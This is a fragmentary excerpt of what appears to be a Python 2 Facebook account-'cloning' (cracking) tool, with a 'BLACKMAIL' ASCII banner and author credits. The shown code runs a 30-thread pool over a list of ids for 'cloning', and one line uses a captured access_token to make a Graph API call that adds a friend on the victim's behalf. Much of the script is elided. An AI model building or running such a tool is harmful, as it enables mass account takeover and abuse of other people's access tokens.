...
\033[1;91m .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   
\033[1;92m| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |  
\033[1;93m| |   ______     | || |   _____      | || |      __      | || |     ______   | || |  ___  ____   | || | ____    ____ | || |      __      | || |     _____    | || |   _____      | |  
\033[1;94m| |  |_   _ \    | || |  |_   _|     | || |     /  \     | || |   .' ___  |  | || | |_  ||_  _|  | || ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || |  |_   _|     | |  
\033[1;95m| |    | |_) |   | || |    | |       | || |    / /\ \    | || |  / .'   \_|  | || |   | |_/ /    | || |  |   \/   |  | || |    / /\ \    | || |      | |     | || |    | |       | |  
\033[1;96m| |    |  __'.   | || |    | |   _   | || |   / ____ \   | || |  | |         | || |   |  __'.    | || |  | |\  /| |  | || |   / ____ \   | || |      | |     | || |    | |   _   | |  
\033[1;97m| |   _| |__) |  | || |   _| |__/ |  | || | _/ /    \ \_ | || |  \ `.___.'\  | || |  _| |  \ \_  | || | _| |_\/_| |_ | || | _/ /    \ \_ | || |     _| |_    | || |   _| |__/ |  | |  
\033[1;98m| |  |_______/   | || |  |________|  | || ||____|  |____|| || |   `._____.'  | || | |____||____| | || ||_____||_____|| || ||____|  |____|| || |    |_____|   | || |  |________|  | |  
\033[1;99m| |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |  
\033[1;91m| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |  
 \033[1;95m'----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   
 
\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.Romi              ║
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.youtube.com/devi')
				requests.post('https://graph.facebook.com/devikinge/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mRomi x Devi\033[1;97m•◈•══════•◈•"
		...
		print "\033[1;92m•◈•══════••◈•\033[1;91mRomix devi\033[1;95m•◈•══════••◈•"
		try:
	...
	jalan('           \033[1;91mRomi king start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mRomi x Devi\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rao Tauheed--•◈•---»" #Devi: Rajpoot 
